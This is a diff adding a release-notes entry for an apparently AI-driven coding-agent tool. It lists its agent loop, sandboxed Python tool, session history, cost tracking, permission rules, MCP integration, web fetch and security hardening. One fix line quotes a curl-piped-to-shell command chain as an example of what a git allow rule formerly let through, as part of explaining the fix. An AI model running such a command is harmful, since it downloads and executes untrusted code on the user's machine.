@@ -1,3 +1,38 @@
+## 0.4.0 (2026-10-09)
+
+### Feat
+
+- **modules**: `wrencode.py` is the agent loop; backends, configure, ui, history, sandbox, permissions, mcp, web and synthesize are sibling modules with one-way dependencies
+- **python**: a `python` tool runs model-written snippets in the pydantic-monty sandbox (no network, shell or environment; the workspace read-only) with `glob`, `read` and `grep` as functions; `pip install 'wrencode[sandbox]'`
+- **history**: conversations in Postgres, a server via `WRENCODE_DATABASE_URL` or embedded PGlite; `/sessions`, `/resume` (a picker, or by id), `/search` finds sessions by their words, `/clear` starts a new one; `pip install 'wrencode[history]'`
+- **history**: every saved session mirrored to a second Postgres (`WRENCODE_MIRROR_URL`) with a retry queue and `/sync`
+- **usage**: a compact line after each turn: tokens up and down, output speed with an arrow against the previous turn, a context meter that warns at the compaction threshold, the turn's cost and the session total; `/usage` for the numbers; the terminal title carries the totals; headless JSON gains `usage` and `cost_usd`
+- **pricing**: a built-in price table for Claude, GPT and Nova models, OpenRouter and NanoGPT catalog prices saved by `/configure`, `WRENCODE_PRICE` to override; the model picker shows prices; a cost estimate under the prompt while typing
+- **streaming**: replies stream as the model writes them on the Anthropic and OpenAI-style backends, rendered line by line; Escape stops mid-sentence; `WRENCODE_STREAM=0` waits for whole replies
+- **input**: messages can span lines: paste keeps line breaks, a backslash before Enter or Alt-Enter continues; `←` `→` Home End Ctrl-A/E/W/U/K and Delete edit in place; `↑` `↓` move between lines and through history
+- **permissions**: rules `bash(git *)`, `edit(src/*)`, `write(.env)`, `mcp(server:tool)`, `fetch(host/*)` allow or deny without asking; deny wins over `a` and `--yes`; `s` at a prompt saves a rule; `/permissions` lists and edits them; a project's allow rules apply only after they are accepted once
+- **mcp**: tools from MCP servers (`.wrencode/mcp.json`, Claude Code's `.mcp.json`, or `~/.wrencode/mcp.json`; stdio or Streamable HTTP) join the tool list as `mcp__server__tool`, with approval unless read-only; `/mcp` shows status; a project's servers start only after they are accepted once; stdlib only
+- **web**: a `fetch(url)` tool on every backend reads a page as text with approval; Anthropic's server-side web search on the Anthropic backend, shown in the transcript and billed on the usage line (`WRENCODE_WEB_SEARCH=0` turns it off)
+- **ui**: approvals show a unified diff with context and one question line; tool results fold to one line when that says it all; the spinner says what is happening, for how long, and that Escape cancels; one status line at startup; arrow-key pickers for models and sessions; errors as a sentence and a next step; the assistant's reply opens with a dot, code is tinted apart from prose; `WRENCODE_THEME=light` for light terminals
+- **synthesize**: one shared completion primitive, unique chat ids, window-aware transcripts; documented
+- **security**: a project `.env` may set only `*_API_KEY` and `ANTHROPIC_WORKSPACE_ID` (the names it set are reported); control characters, C1 controls and bidi overrides in commands, files, URLs and replies are shown, never interpreted; `grep` passes its pattern as an argument; writes under hidden paths are flagged on the resolved path; `glob` stays in the workspace; `fetch` reaches public addresses only and follows redirects on the same host only; MCP servers run without the backend keys, a project's without loader variables, and an HTTP server's headers never follow a redirect; releases ship SHA-256 checksums verified by install.sh; CI runs with read-only permissions
+
+### Fix
+
+- a bash rule must cover every command of a command line (`bash(git *)` no longer allows `git status && curl x | sh`), a prefix ends at a word, and a deny rule holds for read-only MCP tools too
+- `s` at a prompt saves the rule for this project in your own file; editing the shared project file never accepts rules the repository put there; trust is recorded for the bytes that were shown
+- Escape ends a streamed reply at once: nothing more is printed and the connection closes; Ctrl/Shift-arrow keys are read as arrows, not as typed text
+- a reply whose text block stayed empty around a tool call goes back to the API without it; OpenAI-style servers that stream whole tool calls without an index get each call
+- a streamed code line that wrapped is redrawn from its first row; `/mcp reload` stops the old servers; a server's `ping` is answered; a server still connecting at the deadline is reported, not half-registered; tools whose names clash are skipped with a note
+- a fetched page without `</head>` is read in full; a gzip body is capped at the size limit; the fetch rule subject is the lower-cased host without a default port, with the query
+- a mirror URL with a bad port falls back cleanly; the mirror's idle flag can't be set with a snapshot pending; the embedded Postgres socket directory in a shared temp dir must be an owner-only directory of yours
+
+- the embedded Postgres works under a long config path (the socket moves to a short directory), and Node's error text loses its color codes
+- `history.json` follows `WRENCODE_CONFIG_DIR`
+- a shell command's output is not repeated under its call; a streamed line that wrapped is still rendered once complete; a server tool's whole input survives streaming
+- the certifi test holds with a pre-set `SSL_CERT_FILE`; the bash tool closes its pipe
+- no `noqa` markers: rules the design contradicts are off in pyproject with reasons, and a test enforces it
+
 ## 0.3.0 (2026-10-08)
 
 ### Feat
